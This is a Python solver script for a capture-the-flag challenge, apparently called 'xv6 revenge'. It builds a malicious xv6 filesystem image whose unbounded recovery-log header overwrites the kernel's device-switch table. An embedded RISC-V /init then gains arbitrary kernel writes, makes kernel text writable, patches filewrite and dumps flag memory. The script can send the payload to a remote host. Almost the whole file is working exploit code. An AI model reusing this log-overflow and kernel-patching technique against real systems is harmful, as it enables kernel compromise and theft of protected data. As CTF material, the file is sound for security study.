#!/usr/bin/env python3
import argparse
import glob
import os
import shutil
import socket
import struct
import subprocess
import sys
import tempfile
from pathlib import Path

BSIZE = 1024
MAGIC = b"XV6IMGv1"

# Ground-truth addresses for the supplied public/kernel.
CONSOLEWRITE = 0x800000D0
CONSOLEREAD  = 0x8000016E
FETCHADDR    = 0x80002756
KVMINITHART  = 0x80000EF2
FILEWRITE_LI_A0 = 0x80004230
FLAG_PHYS    = 0x87FFF000

# Deterministic page-table page for VA 0x80004000 in this kernel build.
# kalloc returns pages downward from 0x87ffe000; kvmmake allocates the L0
# table for KERNBASE at 0x87ff8000, so PTE[4] covers 0x80004000.
TEXT_PTE_ADDR = 0x87FF8020
TEXT_PTE_RWX_AD = 0x00000000200010CF  # PA 0x80004000 | V/R/W/X/A/D

# Original 8 bytes at filewrite+0x76 are: 05 45 82 97 b5 a8 9b 8a
# Patch only c.li a0,1 -> c.li a0,0, preserving following instructions.
PATCH_FILEWRITE_8 = 0x8A9BA8B597824501

INIT_C = r'''
typedef unsigned long u64;

static inline long xsys(long n, long a0, long a1, long a2,
                        long a3, long a4, long a5) {
  register long ra0 asm("a0") = a0;
  register long ra1 asm("a1") = a1;
  register long ra2 asm("a2") = a2;
  register long ra3 asm("a3") = a3;
  register long ra4 asm("a4") = a4;
  register long ra5 asm("a5") = a5;
  register long ra7 asm("a7") = n;
  asm volatile("ecall"
               : "+r"(ra0)
               : "r"(ra1), "r"(ra2), "r"(ra3), "r"(ra4), "r"(ra5), "r"(ra7)
               : "memory");
  return ra0;
}

#define SYS_exit  2
#define SYS_dup   10
#define SYS_open  15
#define SYS_write 16
#define SYS_mknod 17

static long write(int fd, const void *p, long n) { return xsys(SYS_write, fd, (long)p, n, 0, 0, 0); }
static long open(const char *p, int mode)        { return xsys(SYS_open, (long)p, mode, 0, 0, 0, 0); }
static long mknod(const char *p, int maj, int min){ return xsys(SYS_mknod, (long)p, maj, min, 0, 0, 0); }
static long dup(int fd)                          { return xsys(SYS_dup, fd, 0, 0, 0, 0, 0); }
static void exit_(int x)                         { xsys(SYS_exit, x, 0, 0, 0, 0, 0); for(;;){} }

static void put(const char *s) {
  long n = 0;
  while (s[n]) n++;
  write(1, s, n);
}

// Device 8 is fetchaddr reached through filewrite before the text patch:
//   fetchaddr(a0=1, a1=user_supplied_write_buffer)
// so it copies 8 bytes from user VA 1 into an arbitrary kernel address.
// The first user page is linked RWX, so we can update bytes 1..8 each time.
static void set_src64(u64 v) {
  volatile unsigned char *p = (volatile unsigned char *)1;
  for (int i = 0; i < 8; i++)
    p[i] = (unsigned char)(v >> (8 * i));
}

static void kwrite64(int fd, u64 dst, u64 val) {
  set_src64(val);
  write(fd, (void *)dst, 8);
}

void main(void) {
  // A custom /init starts before fd 0/1/2 are opened.
  if (open("console", 2) < 0) {
    mknod("console", 1, 0);
    open("console", 2);
  }
  dup(0);
  dup(0);
  put("S0 init\\n");

  mknod("aw", 8, 0);
  mknod("fl", 9, 0);
  int fd8 = open("aw", 2);
  int fd9 = open("fl", 2);
  if (fd8 < 0 || fd9 < 0) {
    put("helper open failed\\n");
    exit_(1);
  }
  put("S1 helpers\\n");

  kwrite64(fd8, 0x87FF8020UL, 0x00000000200010CFUL);
  write(fd9, "x", 1);
  put("S2 pte\\n");

  kwrite64(fd8, 0x80004230UL, 0x8A9BA8B597824501UL);
  asm volatile("fence.i" ::: "memory");
  write(fd9, "x", 1);
  put("S3 patch\\n");

  write(1, (void *)0x87FFF000UL, 256);
  put("\\nDONE\\n");
  exit_(0);
}

void _start(void) {
  main();
  exit_(0);
}
'''

LINK_LD = r'''
OUTPUT_ARCH(riscv)
ENTRY(_start)
PHDRS { all PT_LOAD FLAGS(7); }
SECTIONS {
  . = 0;
  .scratch : { BYTE(0); QUAD(0); . = 0x100; } :all
  .text : { *(.text .text.*) } :all
  .rodata : { *(.srodata .srodata.* .rodata .rodata.*) } :all
  .data : { *(.sdata .sdata.* .data .data.*) } :all
  .bss : { *(.sbss .sbss.* .bss .bss.* COMMON) } :all
}
'''

def find_public_dir(arg: str | None) -> Path:
    if arg:
        p = Path(arg).resolve()
    else:
        here = Path.cwd()
        candidates = [here, here / "public", Path(__file__).resolve().parent, Path(__file__).resolve().parent / "public"]
        for c in candidates:
            if (c / "mkfs").exists() and (c / "kernel").exists() and (c / "user").is_dir():
                return c.resolve()
        raise SystemExit("[-] Cannot find public dir. Pass --public /path/to/public")
    if not ((p / "mkfs").exists() and (p / "kernel").exists() and (p / "user").is_dir()):
        raise SystemExit(f"[-] Bad public dir: {p} (need mkfs, kernel, user/)")
    return p

def find_clang() -> str:
    for name in ["clang", "/usr/local/swift/usr/bin/clang"]:
        path = shutil.which(name) if not name.startswith("/") else (name if Path(name).exists() else None)
        if path:
            return path
    raise SystemExit("[-] clang not found. Need clang with riscv64-unknown-elf target.")

def compile_init(out_elf: Path, work: Path) -> None:
    c_path = work / "init.c"
    ld_path = work / "link.ld"
    c_path.write_text(INIT_C)
    ld_path.write_text(LINK_LD)
    clang = find_clang()
    cmd = [
        clang,
        "-target", "riscv64-unknown-elf",
        "-march=rv64gc", "-mabi=lp64d",
        "-nostdlib", "-ffreestanding", "-fno-stack-protector",
        "-fno-pic", "-fno-builtin",
        "-Wl,-T," + str(ld_path),
        "-Wl,--no-relax",
        "-Wl,-z,max-page-size=4096",
        "-o", str(out_elf), str(c_path),
    ]
    subprocess.check_call(cmd)

def le32(x: int) -> int:
    return x & 0xffffffff

def put64_words(words: list[int], idx: int, val: int) -> None:
    if idx + 1 >= len(words):
        raise ValueError("word array too short")
    words[idx] = le32(val)
    words[idx + 1] = le32(val >> 32)

def patch_recovery_log(fs_img: Path) -> None:
    data = bytearray(fs_img.read_bytes())
    if len(data) < 2 * BSIZE:
        raise SystemExit("[-] fs.img too small")

    sb_off = BSIZE
    magic, size, nblocks, ninodes, nlog, logstart, inodestart, bmapstart = struct.unpack_from("<8I", data, sb_off)
    if magic != 0x10203040:
        raise SystemExit(f"[-] bad xv6 superblock magic: 0x{magic:08x}")

    # read_head() has no LOGSIZE bound. It copies n 32-bit block entries into
    # log.lh.block[] and keeps writing into the adjacent devsw table.
    # Exact offsets from this kernel:
    #   log.lh.block[0] = 0x8001f954
    #   devsw          = 0x8001f9d0
    # Therefore:
    #   devsw[1].read  -> index 35/36
    #   devsw[1].write -> index 37/38
    #   devsw[8].write -> index 65/66
    #   devsw[9].write -> index 69/70
    n = 71
    words = [0] * n
    put64_words(words, 35, CONSOLEREAD)
    put64_words(words, 37, CONSOLEWRITE)
    put64_words(words, 65, FETCHADDR)
    put64_words(words, 69, KVMINITHART)

    hdr = struct.pack("<I", n) + b"".join(struct.pack("<I", w) for w in words)
    off = logstart * BSIZE
    data[off:off + len(hdr)] = hdr
    fs_img.write_bytes(data)

    print(f"[+] patched log header at block {logstart}: n={n}, nlog={nlog}")
    print("[+] devsw targets: console preserved, major8=fetchaddr, major9=kvminithart")

def build_payload(public: Path, out_payload: Path, keep: bool = False) -> bytes:
    tmp_obj = tempfile.TemporaryDirectory(prefix="xv6rev_")
    tmp = Path(tmp_obj.name)
    try:
        user_dir = tmp / "user"
        shutil.copytree(public / "user", user_dir)
        shutil.copy2(public / "mkfs", tmp / "mkfs")
        os.chmod(tmp / "mkfs", 0o755)

        init_elf = user_dir / "_init"
        compile_init(init_elf, tmp)
        print(f"[+] built custom /init: {init_elf.stat().st_size} bytes")

        files = sorted("user/" + Path(x).name for x in glob.glob(str(user_dir / "*")))
        cmd = ["./mkfs", "fs.img"] + files
        subprocess.check_call(cmd, cwd=tmp)
        patch_recovery_log(tmp / "fs.img")

        img = (tmp / "fs.img").read_bytes()
        payload = MAGIC + struct.pack("<Q", len(img)) + img
        out_payload.write_bytes(payload)
        print(f"[+] wrote wrapped payload: {out_payload} ({len(payload)} bytes)")

        if keep:
            keep_dir = out_payload.with_suffix(out_payload.suffix + ".work")
            if keep_dir.exists():
                shutil.rmtree(keep_dir)
            shutil.copytree(tmp, keep_dir)
            print(f"[+] kept build dir copy: {keep_dir}")
        return payload
    finally:
        if not keep:
            tmp_obj.cleanup()

def send_remote(host: str, port: int, payload: bytes) -> None:
    print(f"[+] connecting to {host}:{port}")
    with socket.create_connection((host, port), timeout=10) as s:
        s.sendall(str(len(payload)).encode() + b"\n" + payload)
        s.shutdown(socket.SHUT_WR)
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            sys.stdout.buffer.write(chunk)
            sys.stdout.buffer.flush()

def run_chall(public: Path, payload: bytes) -> int:
    chall = public / "chall.sh"
    if not chall.exists():
        raise SystemExit(f"[-] {chall} not found")
    print(f"[+] spawning {chall}")
    p = subprocess.Popen(["bash", str(chall)], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    assert p.stdin is not None and p.stdout is not None
    p.stdin.write(str(len(payload)).encode() + b"\n" + payload)
    p.stdin.close()
    for chunk in iter(lambda: p.stdout.read(4096), b""):
        sys.stdout.buffer.write(chunk)
        sys.stdout.buffer.flush()
    return p.wait()

def main() -> None:
    ap = argparse.ArgumentParser(description="local solver/payload builder for xv6 revenge")
    ap.add_argument("--public", help="path to extracted public/ directory")
    ap.add_argument("--out", default="xv6_revenge_payload.bin", help="wrapped payload output")
    ap.add_argument("--keep", action="store_true", help="keep a copy of the temporary build dir next to --out")
    ap.add_argument("--run", action="store_true", help="spawn public/chall.sh locally and feed the payload")
    ap.add_argument("--host", help="send payload to host instead of spawning chall.sh")
    ap.add_argument("--port", type=int, help="port for --host")
    args = ap.parse_args()

    public = find_public_dir(args.public)
    out = Path(args.out).resolve()
    payload = build_payload(public, out, keep=args.keep)

    if args.host:
        if args.port is None:
            raise SystemExit("[-] --host requires --port")
        send_remote(args.host, args.port, payload)
    elif args.run:
        rc = run_chall(public, payload)
        print(f"\n[+] chall.sh exited with {rc}")
    else:
        print("[+] payload only. Run with --run, or send --out with the provided send_file.py equivalent.")

if __name__ == "__main__":
    main()
